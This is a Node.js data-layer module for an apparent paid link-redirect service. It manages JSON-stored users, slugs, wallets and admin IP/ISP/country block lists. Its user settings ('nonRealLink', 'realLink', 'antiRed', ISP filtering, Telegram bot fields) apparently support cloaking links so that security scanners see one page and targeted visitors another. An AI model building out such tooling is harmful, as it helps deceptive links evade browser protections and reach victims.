const fs = require('fs').promises;
const fssync = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

// Support Render Persistent Disk at /data
const PERSISTENT_DATA_DIR = '/data';
const LOCAL_DATA_DIR = path.join(__dirname, 'data');
const DATA_DIR = fssync.existsSync(PERSISTENT_DATA_DIR) ? PERSISTENT_DATA_DIR : LOCAL_DATA_DIR;

const USERS_FILE = path.join(DATA_DIR, 'users.json');

console.log(`[DB] Using data directory: ${DATA_DIR}`);
console.log(`[DB] Users file: ${USERS_FILE}`);

if (!fssync.existsSync(DATA_DIR)) {
    try {
        fssync.mkdirSync(DATA_DIR, { recursive: true });
    } catch (err) {
        console.error(`Error creating data directory ${DATA_DIR}:`, err);
    }
}

if (!fssync.existsSync(USERS_FILE)) {
    fssync.writeFileSync(USERS_FILE, JSON.stringify([]));
}

// --- Admin-level blocklists (IP / ISP / Country) ---
// Site-wide rules applied to /l/:slug regardless of which user's link was hit.
const ADMIN_BLOCKS_FILE = path.join(DATA_DIR, 'admin-blocklists.json');

if (!fssync.existsSync(ADMIN_BLOCKS_FILE)) {
    fssync.writeFileSync(ADMIN_BLOCKS_FILE, JSON.stringify({
        ips: [],
        isps: [],
        countries: []
    }, null, 2));
}

const VALID_BLOCK_TYPES = new Set(['ips', 'isps', 'countries']);

async function readAdminBlocks() {
    const data = await fs.readFile(ADMIN_BLOCKS_FILE, 'utf8');
    try {
        const parsed = JSON.parse(data);
        return {
            ips: Array.isArray(parsed.ips) ? parsed.ips : [],
            isps: Array.isArray(parsed.isps) ? parsed.isps : [],
            countries: Array.isArray(parsed.countries) ? parsed.countries : []
        };
    } catch (_) {
        return { ips: [], isps: [], countries: [] };
    }
}

async function writeAdminBlocks(blocks) {
    const safe = {
        ips: Array.isArray(blocks.ips) ? blocks.ips : [],
        isps: Array.isArray(blocks.isps) ? blocks.isps : [],
        countries: Array.isArray(blocks.countries) ? blocks.countries : []
    };
    await fs.writeFile(ADMIN_BLOCKS_FILE, JSON.stringify(safe, null, 2));
}

async function addAdminBlock(type, value, reason, addedBy = 'ADMIN') {
    if (!VALID_BLOCK_TYPES.has(type)) {
        throw new Error('Invalid block type');
    }
    const v = typeof value === 'string' ? value.trim() : '';
    if (!v) throw new Error('EMPTY_VALUE');
    const blocks = await readAdminBlocks();
    const dup = blocks[type].some(b => String(b.value).toLowerCase() === v.toLowerCase());
    if (dup) {
        const err = new Error('DUPLICATE_VALUE');
        err.code = 'DUPLICATE_VALUE';
        throw err;
    }
    const entry = {
        id: uuidv4(),
        value: type === 'countries' ? v.toUpperCase() : v,
        reason: typeof reason === 'string' ? reason.trim().slice(0, 200) : '',
        addedAt: new Date().toISOString(),
        addedBy: typeof addedBy === 'string' ? addedBy.slice(0, 80) : 'ADMIN'
    };
    blocks[type].push(entry);
    await writeAdminBlocks(blocks);
    return blocks;
}

async function removeAdminBlock(type, id) {
    if (!VALID_BLOCK_TYPES.has(type)) {
        throw new Error('Invalid block type');
    }
    const blocks = await readAdminBlocks();
    blocks[type] = (blocks[type] || []).filter(b => b.id !== id);
    await writeAdminBlocks(blocks);
    return blocks;
}

async function getUsers() {
    const data = await fs.readFile(USERS_FILE, 'utf8');
    return JSON.parse(data);
}

async function saveUsers(users) {
    await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
}

async function createUser(userData) {
    const users = await getUsers();
    const newUser = {
        id: uuidv4(),
        slug: crypto.randomBytes(4).toString('hex'),
        name: userData.name,
        email: userData.email,
        telegram: userData.telegram,
        password: userData.password, // hashed
        pinHash: userData.pinHash || null, // 4-digit security PIN (bcrypt hash); null until set
        wallet: 0.0,
        isActive: true,
        expiryDate: null, // ISO string for link expiration
        links: [], // Multiple landing pages
        settings: {
            nonRealLink: '',
            realLink: '',
            antiRed: true,
            ispFilter: true,
            reallowVisited: true,
            botToken: '',
            chatId: '',
            mobileIsps: ['ATT', 'VERIZON', 'T-MOBILE', 'SPRINT', 'CRICKET', 'METROPCS']
        },
        forcedIps: [],
        blockedIps: [],
        visitedIps: [],
        pendingPayments: [],
        createdAt: new Date().toISOString()
    };
    users.push(newUser);
    await saveUsers(users);
    return newUser;
}

async function findUserByEmail(email) {
    const users = await getUsers();
    return users.find(u => u.email === email);
}

async function findUserById(id) {
    const users = await getUsers();
    return users.find(u => u.id === id);
}

async function findUserBySlug(slug) {
    if (!slug) return null;
    const users = await getUsers();
    // Only custom uplinks in user.links[] are resolvable now.
    for (const user of users) {
        const link = (user.links || []).find(l => l.slug === slug);
        if (link) return { user, link };
    }
    return null;
}

async function updateUser(id, updates) {
    const users = await getUsers();
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
        users[index] = { ...users[index], ...updates };
        await saveUsers(users);
        return users[index];
    }
    return null;
}

module.exports = {
    createUser,
    getUsers,
    findUserByEmail,
    findUserById,
    findUserBySlug,
    updateUser,
    readAdminBlocks,
    writeAdminBlocks,
    addAdminBlock,
    removeAdminBlock,
    VALID_BLOCK_TYPES
};
